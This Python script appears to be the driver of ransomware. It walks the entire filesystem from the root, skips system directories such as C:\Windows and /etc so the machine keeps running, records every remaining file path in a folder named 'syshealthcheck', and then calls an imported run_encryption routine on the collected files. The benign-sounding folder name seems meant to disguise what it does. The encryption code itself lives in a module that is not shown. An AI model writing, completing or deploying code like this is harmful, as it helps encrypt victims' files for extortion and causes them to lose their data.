import os
from Commands import AdminCommandRunner
from encryption_test import run_encryption
from GUI2 import App
import tkinter as tk
from StartUp import main

# List of directories to avoid by platform
ESSENTIAL_DIRS = {
    "Windows": ["C:\\Windows", "C:\\Program Files", "C:\\Program Files (x86)"],
    "Linux": ["/boot", "/etc", "/proc", "/sys", "/dev"],
    "macOS": ["/System", "/Library", "/Volumes", "/dev"]
}


def explore_directories(start_path, excluded_dirs):
    """
    Recursively explore the directory structure from the given start path,
    excluding essential system directories. Collect all file paths.
    """
    discovered_files = []  # List to store discovered file paths

    for root, dirs, files in os.walk(start_path):
        # Skip essential directories
        if any(os.path.commonpath([root, ed]) == ed for ed in excluded_dirs):
            continue

        print(f"\nDirectory: {root}")

        # Collect and print all subdirectories
        if dirs:
            print("  Subdirectories:")
            for d in dirs:
                print(f"    - {d}")
        else:
            print("  No subdirectories")

        # Collect and print all files
        if files:
            print("  Files:")
            for f in files:
                file_path = os.path.join(root, f)
                print(f"    - {file_path}")
                discovered_files.append(file_path)  # Store the full file path
        else:
            print("  No files")

    return discovered_files  # Return the list of discovered file paths

def get_start_path(platform):
    """Return the appropriate start path based on the detected platform."""
    if platform == "Windows":
        return "C:\\"
    elif platform in ["macOS", "Linux"]:
        return "/"
    else:
        print("Unsupported platform. Exiting.")
        exit(1)

def get_excluded_dirs(platform):
    """Return a list of essential system directories to avoid."""
    return ESSENTIAL_DIRS.get(platform, [])

def create_syshealthcheck_folder(platform):
    """Create the syshealthcheck folder in the root directory."""
    if platform == "Windows":
        folder_path = "C:\\syshealthcheck"
    elif platform in ["macOS", "Linux"]:
        folder_path = "/syshealthcheck"
    else:
        raise ValueError("Unsupported platform")

    # Check if the folder exists; if not, create it
    try:
        if not os.path.exists(folder_path):
            os.makedirs(folder_path)
            print(f"Folder created at: {folder_path}")
        else:
            print(f"Folder already exists at: {folder_path}")
    except Exception as e:
        print(f"Error creating folder: {e}")
        exit(1)

    return folder_path  # Return the folder path

def write_to_file(file_paths, output_file):
    """Write the collected file paths to a text file."""
    try:
        with open(output_file, 'w') as f:
            for path in file_paths:
                f.write(path + '\n')
        print(f"File paths successfully written to {output_file}")
    except Exception as e:
        print(f"Error writing to file: {e}")

if __name__ == "__main__":
    # Create an instance of AdminCommandRunner to detect the platform
    main()
    runner = AdminCommandRunner()
    platform = runner.detect_platform()

    print(f"Detected platform: {platform}")

    # Get the appropriate start path and directories to exclude
    start_path = get_start_path(platform)
    excluded_dirs = get_excluded_dirs(platform)
    
    # root = tk.Tk()
    # app = App(root)
    # root.mainloop()

    # Create the syshealthcheck folder in the root directory
    folder_path = create_syshealthcheck_folder(platform)

    # Define the output file path inside the syshealthcheck folder
    output_file_path = os.path.join(folder_path, "discovered_files.txt")

    # Explore directories starting from the chosen path, avoiding essential ones
    try:
        discovered_files = explore_directories(start_path, excluded_dirs)  # Collect file paths
        write_to_file(discovered_files, output_file_path)  # Write paths to the file in syshealthcheck folder
        run_encryption()  # Perform encryption task after writing file paths
    except PermissionError as e:
        print(f"Permission error: {e}")
    except Exception as e:
        print(f"An unexpected error occurred: {e}")
